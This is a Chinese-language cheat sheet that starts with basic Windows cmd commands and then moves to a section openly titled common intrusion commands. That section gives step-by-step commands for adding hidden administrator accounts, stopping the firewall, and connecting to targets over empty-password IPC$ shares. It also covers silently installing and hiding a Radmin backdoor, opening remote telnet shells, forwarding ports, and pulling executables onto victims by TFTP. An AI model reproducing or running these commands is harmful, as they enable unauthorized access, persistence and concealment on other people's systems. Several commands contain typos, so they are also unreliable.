知识点：
```
help 查看cmd帮助
dir 查看当前目录
copy 拷贝文件到指定地方
ipconfig 查看本机IP
net user 查看当前主机
net localgroup 查看用户组
net localgroup administrtors 查看管理员组
net user xxx 1123 /add 添加用户
net user xxx /del 删除用户
net localgroup administrtors abc /add 将abc用户添加进管理员组
net localgroup administrtors abc /del 将abc用户删除
type 查看指定文件类似于linux的cat
del 删除指定文件
netstat -ant 查看本地开放的端口
tasklist /svc 查看正在运行的服务
findstr 从内容中搜索指定的东东 例如：netstat -ant | findstr "80"
```

【Windows/Linux】windows常用入侵命令  
```
MMC 计算机元管理控制面板
net start TermService 启动3389服务
cmd.exe /c net stop sharedaccess 关闭所有防火墙
iisreset /reboot IIS重启
tracert xxx.com 路由跟踪
net user admin$  sdsd /add 添加隐藏账户的第一步
net localgroup administrators admin$ /add 将用户添加至管理员权限
telnet IP telent连接到目标
query user 查看当前在线的用户
net user share C$ /del 删除共享
net share 查看当前smb共享
net view 查看当前网络共享
net guest 123456 /add 为guest设置密码
net localgroup administrtors guest /add 将guest添加到管理员用户

完全禁止系统模认工享
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\DelegateFolders\{59031a47-3f72-44a7-89c5-5595fe6b30ee}]

3389替换服务-----------------------
中修改[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService]
c:\winnt\system32\copy termsrv.exe service.exe
c:\winnt\system32\cd..
c:\winnt\sc \\127.0.0.1 config Alerter binpath= c:\winnt\system32\service.exe

端口转向：f:\web\ftp.exe "c:\fpipe.exe -v -l 开放的端口 -r 要转向的端口 ip"

使用空口令连接:
net use \\对方IP\ipc$ "" /user:"administrator"
(在上传文件的目录下)远程复制文件:
c:\radmin>net use \\a-01\ipc$ "12345" /user:administrator

c:\ramdin>copy r_server.exe \\a-01\admin$\system32
c:\ramdin>copy radmin.reg \\a-01\admin$\sytem32
在对方CMD下：
c:\winnt\system32\>regedit /s radmin.reg
c:\winnt\system32\>r_server.exe /install /silenec
net start r_server

copy r_server.exe \\对方IP\admin$\system32
c:\opentelnet.exe \\IP ADMINISTRATOR "" 0 90


copy 文件名 \\IP\admin$\system32
进入对方CMD:
c:\opentelnet.exe \\Ip administrator "" 0 90 
登陆CMD:
c:\telnet IP 90

安装RADMIN:
c:\winnt\system32\
                   r_server /install silence
c:\winnt\system32\
                   r-server
导入注册表:
c:\winnt\system32\regedit.exe /s aaa.reg
看端口:
c:\winnt\system32\
                   netstat -an
改端口:
c:\winnt\system32\
                   r_server.exe /port:1024 /pass:1234 /save /silence
起动服务:
c:\winnt\system32\net start r_server
隐藏文件:
c:\winnt\system32\attrib.exe +h r_server.exe +h

%systemroot$\system32

看看共享开了没有,没有的话把共享开开 

c:\winnt\system32>net share 
清单是空的。 

c:\winnt\system32>net share ipc$ 
命令成功完成。 
c:\winnt\system32>net share admin$ 
命令成功完成。 

注册表运行命令
regedit

查看端口：netstat-n

SA传送文件TFTP
先在本机开tftp服务 sqlexec

tftp-i IP get windxp.exe c:\windows\system32\com\windxp.exe
```